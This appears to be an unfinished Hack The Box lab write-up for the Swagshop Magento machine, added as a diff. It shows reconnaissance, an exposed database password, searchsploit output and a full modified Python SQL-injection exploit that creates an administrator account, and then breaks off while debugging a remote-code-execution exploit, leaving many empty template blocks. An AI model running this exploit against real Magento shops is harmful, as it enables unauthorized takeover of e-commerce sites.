@@ -1,0 +1,234 @@
+Swagshop - Hack The Box - Easy Linux
+
+Port: 80 and 22 open
+Magento CMS for shopping, similar to wordpress.
+index.php
+
+When hovering over links we see the ful path of the link.
+http://10.10.10.140/index.php/customer/account/login/
+
+Apache modrewrite is probably misconfigured, since there is no reason to put index.php in every url.
+
+We see an old public copyright of 2014.
+© 2014 Magento Demo Store. All Rights Reserved.
+
+We can search for cve's, magneto code scan and we get a magento scanner
+https://github.com/steverobbins/magescan.git
+https://github.com/steverobbins/magescan/releases/download/v1.12.9/magescan.phar
+Commands and Output:
+====================================================================================================================================
+mkdir magento
+cd magento
+wget https://github.com/steverobbins/magescan/releases/download/v1.12.9/magescan.phar
+php magescan.phar scan:all http://10.10.10.140/
+====================================================================================================================================
+
+
+We find the version of magento
+Commands and Output:
+====================================================================================================================================
++-----------+------------------+
+| Parameter | Value            |
++-----------+------------------+
+| Edition   | Community        |
+| Version   | 1.9.0.0, 1.9.0.1 |
++-----------+------------------+
+====================================================================================================================================
+
+if we go to http://10.10.10.140/app/etc/local.xml
+config file
+we find creds for root.
+
+Commands and Output:
+====================================================================================================================================
+<host>localhost</host>
+<username>root</username>
+<password>fMVWh7bDHpgZkyfqQXreTjU9</password>
+<dbname>swagshop</dbname>
+<initStatements>SET NAMES utf8</initStatements>
+<model>mysql4</model>
+<type>pdo_mysql</type>
+<pdoType></pdoType>
+====================================================================================================================================
+
+We don't find much more so we perform a searchsploit.
+Commands and Output:
+====================================================================================================================================
+ searchsploit magento
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                            | php/webapps/38573.txt
+eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                 | php/webapps/38651.txt
+Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting      | php/webapps/32808.txt
+Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scriptin | php/webapps/32809.txt
+Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                               | php/webapps/32810.txt
+Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                          | php/webapps/39838.php
+Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                            | php/webapps/37811.py
+Magento eCommerce - Local File Disclosure                                                               | php/webapps/19793.txt
+Magento eCommerce - Remote Code Execution                                                               | xml/webapps/37977.py
+Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                  | php/webapps/35996.txt
+Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                             | php/webapps/35052.txt
+Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                            | php/webapps/48135.php
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+====================================================================================================================================
+
+We will try to run one of the exploits.
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/swagshop/magento]
+└──╼ $searchsploit -m xml/webapps/37977.py
+  Exploit: Magento eCommerce - Remote Code
+====================================================================================================================================
+
+We will use the python script but we have to modify it first.
+Commands and Output:
+====================================================================================================================================
+import requests
+import base64
+import sys
+
+target = "http://swagshop.htb/index.php"
+proxy = {'http':'http://localhost:8080'}
+
+if not target.startswith("http"):
+    target = "http://" + target
+
+if target.endswith("/"):
+    target = target[:-1]
+
+target_url = target + "/admin/Cms_Wysiwyg/directive/index/"
+
+q="""
+SET @SALT = 'rp';
+SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
+SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
+INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
+INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
+"""
+
+
+query = q.replace("\n", "").format(username="testing", password="testing")
+pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
+message_bytes = pfilter.encode('ascii')
+bytez = base64.b64encode(message_bytes)
+base64_message = bytez.decode('ascii')
+
+# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
+r = requests.post(target_url, data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ","filter": base64_message,"forwarded": 1}, proxies=proxy)
+if r.ok:
+    print("WORKED")
+    print("Check {0}/admin with creds testing:testing".format(target))
+else:
+    print("DID NOT WORK")
+====================================================================================================================================
+
+The script takes advantage of an sql injection to create credentials and allow access to the newly created user.
+
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/swagshop/magento]
+└──╼ $python 37977.py 
+WORKED
+Check http://swagshop.htb/index.php/admin with creds testing:testing
+====================================================================================================================================
+
+Now that we are logged in, we have to find a way to get a reverse shell.
+Looking at searchsploit we can use the following:
+Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/swagshop/magento]
+└──╼ $searchsploit -m php/webapps/37811.py 
+====================================================================================================================================
+
+We will have to modify the install date from the previous oath file we found.
+"Wed, 08 May 2019 07:23:09 +0000"
+Mechanize creates an automated browser which might cause issues
+Commands and Output:
+====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/swagshop/magento]
+└──╼ $python testing.py http://10.10.10.140/index.php/admin/ "uname -a"
+> /home/user/htb/swagshop/magento/testing.py(70)<module>()
+-> url = url.group(1)
+(Pdb) print url
+*** SyntaxError: Missing parentheses in call to 'print'. Did you mean print(url)?
+(Pdb) print(url)
+None
+(Pdb) 
+====================================================================================================================================
+
+We have an empty variable that prevents the program from exectuing, we have to find what causes the error.
+Looking throught the code we find an odd line:
+request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)$
+
+The 7d period might be casuing issues let's increase the time.
+
+Command and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
+
+Commands and Output:
+====================================================================================================================================
+====================================================================================================================================
